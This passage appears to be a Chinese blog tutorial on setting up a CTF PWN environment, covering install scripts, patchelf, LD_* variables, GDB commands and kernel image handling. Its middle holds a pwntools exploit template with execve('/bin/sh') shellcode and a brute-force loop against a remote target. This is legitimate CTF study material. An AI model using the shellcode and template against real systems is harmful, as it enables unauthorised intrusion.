docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment"># docker</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    &quot;registry-mirrors&quot;:[</span></span><br><span class="line"><span class="string">        &quot;https://docker.mirrors.ustc.edu.cn&quot;,</span></span><br><span class="line"><span class="string">        &quot;https://registry.docker-cn.com&quot;</span></span><br><span class="line"><span class="string">    ]</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="built_in">sudo</span> usermod -aG docker <span class="variable">$&#123;USER&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># neovim</span></span><br><span class="line"><span class="built_in">mkdir</span> ~/.config/nvim \</span><br><span class="line">    &amp;&amp; <span class="built_in">cat</span> &gt; ~/.config/nvim/init.vim &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">set nu</span></span><br><span class="line"><span class="string">set tabstop=4</span></span><br><span class="line"><span class="string">set shiftwidth=4</span></span><br><span class="line"><span class="string">set softtabstop=4</span></span><br><span class="line"><span class="string">set expandtab</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># git</span></span><br><span class="line">git config --global user.name <span class="string">&quot;hawk&quot;</span> \</span><br><span class="line">    &amp;&amp; git config --global user.email 18801353760@163.com \</span><br><span class="line">    &amp;&amp; git config --global core.editor vi</span><br><span class="line"></span><br><span class="line"><span class="comment"># python</span></span><br><span class="line">python3 -m pip install -U --force-reinstall pip -i https://pypi.tuna.tsinghua.edu.cn/simple \</span><br><span class="line">    &amp;&amp; python3 -m pip config <span class="built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwntools</span></span><br><span class="line">python3 -m pip install pwntools</span><br><span class="line"></span><br><span class="line"><span class="comment"># ropper</span></span><br><span class="line">python3 -m pip install ropper</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg</span></span><br><span class="line">git config --global url.<span class="string">&quot;https://ghproxy.com/https://github.com/&quot;</span>.insteadOf <span class="string">&quot;https://github.com/&quot;</span> \</span><br><span class="line">    &amp;&amp; git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg.git ~/pwndbg \</span><br><span class="line">    &amp;&amp; (<span class="built_in">cd</span> ~/pwndbg &amp;&amp; ./setup.sh) \</span><br><span class="line">    &amp;&amp; git config --global --<span class="built_in">unset</span> url.<span class="string">&quot;https://ghproxy.com/https://github.com/&quot;</span>.insteadOf \</span><br><span class="line">    &amp;&amp; python3 -m pip install pwnlib psutil</span><br><span class="line"></span><br><span class="line"><span class="comment"># ruby</span></span><br><span class="line"><span class="built_in">sudo</span> gem install one_gadget seccomp-tools</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="ubuntu22-04"><a href="#ubuntu22-04" class="headerlink" title="ubuntu22.04"></a>ubuntu22.04</h2>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">set</span> -x</span><br><span class="line"></span><br><span class="line"><span class="comment"># apt mirror</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/apt/sources.list &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy main restricted universe multiverse</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-security main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-security main restricted universe multiverse</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse</span></span><br><span class="line"><span class="string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># necessary software</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get update \</span><br><span class="line">    &amp;&amp; <span class="built_in">sudo</span> apt-get install -y python3 python3-dev python3-pip \</span><br><span class="line">    gdb patchelf strace \</span><br><span class="line">    ruby ruby-dev \</span><br><span class="line">    gcc gcc-multilib g++-multilib nasm \</span><br><span class="line">    git wget curl neovim \</span><br><span class="line">    qemu-system docker docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb</span></span><br><span class="line"><span class="built_in">sudo</span> sed -i <span class="string">&quot;s/^kernel.yama.ptrace_scope = 1$/kernel.yama.ptrace_scope = 0/&quot;</span> /etc/sysctl.d/10-ptrace.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># docker</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    &quot;registry-mirrors&quot;:[</span></span><br><span class="line"><span class="string">        &quot;https://docker.mirrors.ustc.edu.cn&quot;,</span></span><br><span class="line"><span class="string">        &quot;https://registry.docker-cn.com&quot;</span></span><br><span class="line"><span class="string">    ]</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="built_in">sudo</span> usermod -aG docker <span class="variable">$&#123;USER&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># neovim</span></span><br><span class="line"><span class="built_in">mkdir</span> ~/.config/nvim \</span><br><span class="line">    &amp;&amp; <span class="built_in">cat</span> &gt; ~/.config/nvim/init.vim &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">set nu</span></span><br><span class="line"><span class="string">set tabstop=4</span></span><br><span class="line"><span class="string">set shiftwidth=4</span></span><br><span class="line"><span class="string">set softtabstop=4</span></span><br><span class="line"><span class="string">set expandtab</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># git</span></span><br><span class="line">git config --global user.name <span class="string">&quot;hawk&quot;</span> \</span><br><span class="line">    &amp;&amp; git config --global user.email 18801353760@163.com \</span><br><span class="line">    &amp;&amp; git config --global core.editor vi</span><br><span class="line"></span><br><span class="line"><span class="comment"># python</span></span><br><span class="line">python3 -m pip install -U --force-reinstall pip -i https://pypi.tuna.tsinghua.edu.cn/simple \</span><br><span class="line">    &amp;&amp; python3 -m pip config <span class="built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwntools</span></span><br><span class="line">python3 -m pip install pwntools</span><br><span class="line"></span><br><span class="line"><span class="comment"># ropper</span></span><br><span class="line">python3 -m pip install ropper</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg</span></span><br><span class="line">git config --global url.<span class="string">&quot;https://ghproxy.com/https://github.com/&quot;</span>.insteadOf <span class="string">&quot;https://github.com/&quot;</span> \</span><br><span class="line">    &amp;&amp; git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg.git ~/pwndbg \</span><br><span class="line">    &amp;&amp; (<span class="built_in">cd</span> ~/pwndbg &amp;&amp; ./setup.sh) \</span><br><span class="line">    &amp;&amp; git config --global --<span class="built_in">unset</span> url.<span class="string">&quot;https://ghproxy.com/https://github.com/&quot;</span>.insteadOf \</span><br><span class="line">    &amp;&amp; python3 -m pip install pwnlib psutil</span><br><span class="line"></span><br><span class="line"><span class="comment"># ruby</span></span><br><span class="line"><span class="built_in">sudo</span> gem install one_gadget seccomp-tools</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h1><p>  <strong>CTF</strong>的<strong>PWN</strong>类型题目中，会有复杂的动态链接库和依赖关系，我们需要修改这些二进制的信息，使其可以在本地环境下正常运行，可以通过<strong>patchelf</strong>程序进行实现。</p>
<h2 id="dynamic-loader"><a href="#dynamic-loader" class="headerlink" title="dynamic loader"></a>dynamic loader</h2><p>  如果没有正确的动态载入器，我们会导致程序执行错误或无法找到程序，因此可以通过如下命令修改指定的动态载入器地址<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter [path] [execute]</span><br></pre></td></tr></table></figure></p>
<h2 id="runtime-path"><a href="#runtime-path" class="headerlink" title="runtime path"></a>runtime path</h2><p>  有时程序需要使用特殊的动态链接库，因此其指定了动态链接库的首要查找路径，即<strong>runtime path(rpath)</strong>。我们在本地可以通过修改<strong>rpath</strong>字段的值，从而让其在本地的对应路径下去寻找动态链接库，命令如下<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-rpath [path] [execute]</span><br></pre></td></tr></table></figure></p>
<h1 id="LD-环境变量"><a href="#LD-环境变量" class="headerlink" title="LD_*环境变量"></a>LD_*环境变量</h1><p>  由于程序的动态链接和依赖关系十分的复杂，因此linux本身也提供了一些环境变量，方便进行程序动态链接和依赖的查找和调试</p>
<h2 id="LD-DEBUG"><a href="#LD-DEBUG" class="headerlink" title="LD_DEBUG"></a>LD_DEBUG</h2><p>  实际上通过设置<strong>LD_DEBUG</strong>变量，可以方便的调试程序动态链接的各种过程，比如</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_DEBUG=libs [execute]</span><br></pre></td></tr></table></figure>
<p>  终端会输出程序寻找动态库的全过程，然后接着是正常的执行过程。</p>
<p>  <strong>LD_DEBUG</strong>中包含多个可选的值，如<strong>libs</strong>、<strong>symbols</strong>等，可以通过设置<strong>help</strong>值，然后屏幕会输出所有的可选项及其含义。</p>
<h2 id="LD-LIBRARY-PATH"><a href="#LD-LIBRARY-PATH" class="headerlink" title="LD_LIBRARY_PATH"></a>LD_LIBRARY_PATH</h2><p>  类似于前面的<strong>runtime path</strong>，但是优先级次一级。即程序运行前，在查找动态链接库时，会首先在指定的<strong>rpath</strong>路径下查找；然后在指定的<strong>LD_LIBRARY_PATH</strong>路径下查找；最后在系统的默认路径下进行查找</p>
<p>  其命令执行形式如下所示<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_LIBRARY_PATH=[path] [execute]</span><br></pre></td></tr></table></figure></p>
<h1 id="GDB调试器"><a href="#GDB调试器" class="headerlink" title="GDB调试器"></a>GDB调试器</h1><p>  再做<em>PWN</em>题目的时候，需要进行相关的调试，这就需要Linux中的<strong>GDB</strong>进行辅助。</p>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>  <strong>GDB</strong>及其插件中提供了大量的操作，方便进行调试程序，在<a target="_blank" rel="noopener" href="http://www.gnu.org/software/gdb/documentation/">GDB教程资源</a>和<a target="_blank" rel="noopener" href="https://browserpwndbg.readthedocs.io/en/docs/commands/misc/pwndbg/">pwndbg教程</a>中有详细的信息，这里简单介绍几个</p>
<ol>
<li><code>starti</code>，该命令将程序执行到真正的入口处，并停止等待后续<strong>DEBUG</strong>命令</li>
<li><code>call [function]</code>，直接调用<code>function</code>函数执行</li>
<li><code>break [address] if [condition]</code>，即当条件<code>condition</code>满足时，程序会在执行到<code>address</code>时停止</li>
<li><code>break *$rebase(address)</code>，即在装载基地址偏移<code>address</code>设立断点</li>
<li><code>dprintf *$rebase(address) &quot;%d\n&quot;, $rax</code>，即当执行到<code>*$rebase(address)</code>地址处，输出相关的格式信息</li>
<li><code>find [/SIZE-CHAR] START-ADDRESS, END-ADDRESS, EXPR1</code>，即在指定范围内寻找指定值和类型的数据，其中，<strong>SIZE-CHAR</strong>可选<em>b</em>、<em>h</em>、<em>w</em>、<em>g</em>，分别表示8bit、16bit、32bit和64bit</li>
<li><code>p *(struct s*)(address)</code>，即将<em>address</em>地址处的变量当作<strong>struct s</strong>结构体的指针，并打印出具体的结构体信息</li>
<li><code>![command]</code>，即在gdb中打开<strong>shell</strong>，执行<em>command</em>指令</li>
</ol>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>  除了手动一条一条命令的进行交互，也可以通过命令行，按照提前给定的指令依次执行，如下所示<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb [file] -ex [command1] -ex [command2] ...</span><br></pre></td></tr></table></figure><br>  之后，gdb加载给定的目标程序，并按照参数顺序，依次在<strong>GDB</strong>中执行参数中传递的命令</p>
<h1 id="pwntools库"><a href="#pwntools库" class="headerlink" title="pwntools库"></a>pwntools库</h1><p>  这是专门用于CTF和漏洞利用的Python库</p>
<h2 id="PWN模板"><a href="#PWN模板" class="headerlink" title="PWN模板"></a>PWN模板</h2><p>  为了方便<em>PWN</em>，这里专门给出一个标准脚本，可以稍加修改即可用于任何不同的<em>PWN</em>题目<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	待修改数据</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span>				<span class="comment"># 32位使用i386</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">execve_file = <span class="literal">None</span></span><br><span class="line">lib_file = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	使用lambda函数包装pwntools的API，从而使与用户交互的都是str即可</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">ENCODING = <span class="string">&#x27;ISO-8859-1&#x27;</span></span><br><span class="line">se	= <span class="keyword">lambda</span> senddata									: r.send(senddata.encode(ENCODING))</span><br><span class="line">sa	= <span class="keyword">lambda</span> recvdata, senddata, timeout=<span class="number">0x3f3f3f3f</span>						: r.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING), timeout=timeout)</span><br><span class="line">sl	= <span class="keyword">lambda</span> senddata									: r.sendline(senddata.encode(ENCODING))</span><br><span class="line">sla	= <span class="keyword">lambda</span> recvdata, senddata, timeout=<span class="number">0x3f3f3f3f</span>						: r.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING), timeout=timeout)</span><br><span class="line">re	= <span class="keyword">lambda</span> numb=<span class="number">0x3f3f3f3f</span>, timeout=<span class="number">0x3f3f3f3f</span>						: (r.recv(numb, timeout=timeout).decode(ENCODING))</span><br><span class="line">ru	= <span class="keyword">lambda</span> recvdata, timeout=<span class="number">0x3f3f3f3f</span>							: (r.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING))</span><br><span class="line">uu32	= <span class="keyword">lambda</span> data										: u32((data.ljust(<span class="number">4</span>, <span class="string">&#x27;\x00&#x27;</span>)).encode(ENCODING), signed=<span class="string">&quot;unsigned&quot;</span>)</span><br><span class="line">uu64	= <span class="keyword">lambda</span> data										: u64((data.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)).encode(ENCODING), signed=<span class="string">&quot;unsigned&quot;</span>)</span><br><span class="line">iu32	= <span class="keyword">lambda</span> data										: u32((data.ljust(<span class="number">4</span>, <span class="string">&#x27;\x00&#x27;</span>)).encode(ENCODING), signed=<span class="string">&quot;signed&quot;</span>)</span><br><span class="line">iu64	= <span class="keyword">lambda</span> data										: u64((data.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)).encode(ENCODING), signed=<span class="string">&quot;signed&quot;</span>)</span><br><span class="line">up32	= <span class="keyword">lambda</span> data										: (p32(data, signed=<span class="string">&quot;unsigned&quot;</span>).decode(ENCODING))</span><br><span class="line">up64	= <span class="keyword">lambda</span> data										: (p64(data, signed=<span class="string">&quot;unsigned&quot;</span>).decode(ENCODING))</span><br><span class="line">ip32	= <span class="keyword">lambda</span> data										: (p32(data, signed=<span class="string">&quot;signed&quot;</span>).decode(ENCODING))</span><br><span class="line">ip64	= <span class="keyword">lambda</span> data										: (p64(data, signed=<span class="string">&quot;signed&quot;</span>).decode(ENCODING))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	elf.plt[`symbol`] 获取elf文件中导入符号的plt地址</span></span><br><span class="line"><span class="string">	elf.got[`symbol`] 获取elf文件中导入符号的got地址</span></span><br><span class="line"><span class="string">	elf.sym[&#x27;symbol&#x27;] 获取elf文件中本地符号的函数实际地址</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> execve_file != <span class="literal">None</span>:</span><br><span class="line">	elf = ELF(execve_file)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	lib.sym[`symbol`] 获取lib中符号地址</span></span><br><span class="line"><span class="string">	next(lib.search(&#x27;string&#x27;)) 获取lib中字符串地址</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> lib_file != <span class="literal">None</span>:</span><br><span class="line">	lib = ELF(lib_file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	执行爆破攻击</span></span><br><span class="line"><span class="string">	只有当成功获取shell或者键盘Ctrl+C退出时，程序中止循环</span></span><br><span class="line"><span class="string">	否则程序一直进行循环</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">	<span class="keyword">global</span> r</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;d&#x27;</span> <span class="keyword">in</span> sys.argv:</span><br><span class="line">		r = process(execve_file)</span><br><span class="line">		gdb.attach(r)	<span class="comment"># 断点必须在第一个输入之后</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		r = remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">	<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">		这里给出asm 汇编-&gt;机器代码的相关样例</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">if</span> context.arch == <span class="string">&#x27;amd64&#x27;</span>:</span><br><span class="line">		shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	mov	rax, %d		/*rbx = &quot;/bin/sh&quot;*/</span></span><br><span class="line"><span class="string">	push	rax</span></span><br><span class="line"><span class="string">	mov	rdi, rsp	/*rdi -&gt; &quot;/bin/sh&quot;*/</span></span><br><span class="line"><span class="string">	xor	esi, esi	/*esi -&gt; NULL*/</span></span><br><span class="line"><span class="string">	xor	edx, edx	/*edx -&gt; NULL*/</span></span><br><span class="line"><span class="string">	push	0x3b</span></span><br><span class="line"><span class="string">	pop	rax		/*rax = 0x3b*/</span></span><br><span class="line"><span class="string">	syscall			/*execve(&quot;/bin/sh&quot;)*/</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	label1:</span></span><br><span class="line"><span class="string">	mov	rax, [rsp + %d]	/* 测试内存访问 */</span></span><br><span class="line"><span class="string">	cmp	rax, 1</span></span><br><span class="line"><span class="string">	je	label1		/* 测试近跳	*/</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span>%(uu64(<span class="string">&#x27;/bin/sh&#x27;</span>), <span class="number">8</span>)).decode(ENCODING)</span><br><span class="line">	<span class="keyword">elif</span> context.arch == <span class="string">&#x27;i386&#x27;</span>:</span><br><span class="line">		shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	push	%d		/*&quot;/bin&quot;*/</span></span><br><span class="line"><span class="string">	push	%d		/*&quot;/sh\x00&quot;*/</span></span><br><span class="line"><span class="string">	mov	ebx, esp	/*ebx -&gt; &quot;/bin/sh&quot;*/</span></span><br><span class="line"><span class="string">	xor	ecx, ecx	/*ecx -&gt; NULL*/</span></span><br><span class="line"><span class="string">	xor	edx, edx	/*edx -&gt; NULL*/</span></span><br><span class="line"><span class="string">	push	11</span></span><br><span class="line"><span class="string">	pop	eax		/*eax = 11*/</span></span><br><span class="line"><span class="string">	int 0x80		/*execve(&quot;/bin/sh&quot;)*/</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	label1:</span></span><br><span class="line"><span class="string">	mov	eax, [esp + %d]	/* 测试内存访问 */</span></span><br><span class="line"><span class="string">	cmp	eax, 1</span></span><br><span class="line"><span class="string">	je	label1		/* 测试近跳	*/</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span>%(uu32(<span class="string">&#x27;/sh&#x27;</span>), uu32(<span class="string">&#x27;/bin&#x27;</span>), <span class="number">4</span>)).decode(ENCODING)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		exp()</span><br><span class="line">		sl(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">		data = ru(<span class="string">&#x27;&#125;&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;&#123;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">			r.close()</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			log.info(data)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">continue</span></span><br></pre></td></tr></table></figure></p>
<h1 id="Kernel"><a href="#Kernel" class="headerlink" title="Kernel"></a>Kernel</h1><p>  kernel pwn中涉及非常琐碎的知识点，这里简单介绍一些</p>
<h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><h3 id="内核文件"><a href="#内核文件" class="headerlink" title="内核文件"></a>内核文件</h3><p>  一般有如下几种内核文件格式</p>
<ol>
<li><strong>vmlinux</strong><br>从源码编译出来的，原始内核二进制文件</li>
<li><strong>bzImage</strong><br>big zImage，也就是更大的zImage。而<strong>zImage</strong>是<strong>vmlinux</strong>经过压缩后的文件，使用<a href="extract-vmlinux">extract-vmlinux脚本</a>将<strong>zImage</strong>解压为<strong>vmlinux</strong><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./extract-vmlinux /path/to/bzImage &gt; /path/to/vmlinux</span><br></pre></td></tr></table></figure>
亦可使用<a target="_blank" rel="noopener" href="https://github.com/marin-m/vmlinux-to-elf">vmlinux-to-elf</a>，将<strong>bzImage</strong>转换为带符号的<strong>vmlinux</strong><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmlinux-to-elf /path/to/bzImage /path/to/vmlinux</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="镜像文件"><a href="#镜像文件" class="headerlink" title="镜像文件"></a>镜像文件</h3><p>  即文件系统镜像——简单来说，该文件中保存着一个文件系统的<strong>dump</strong>。只要将该文件映射入内存，即建立了根文件系统所需要的结构信息</p>
<p>  一般名称为<strong>rootfs.cpio</strong><br>  使用如下命令将其文件结构导出到当前目录中<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -D <span class="variable">$&#123;dir&#125;</span> -idv &lt; /path/to/rootfs.cpio</span><br></pre></td></tr></table></figure></p>
<p>  如果想将<strong>${dir}</strong>的目录数据和结构作为内核的根目录，使用如下命令打包成文件系统镜像<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">cd</span> <span class="variable">$&#123;dir&#125;</span>; find . | cpio -o --format=newc &gt; /path/to/rootfs.cpio)</span><br></pre></td></tr></table></figure></p>
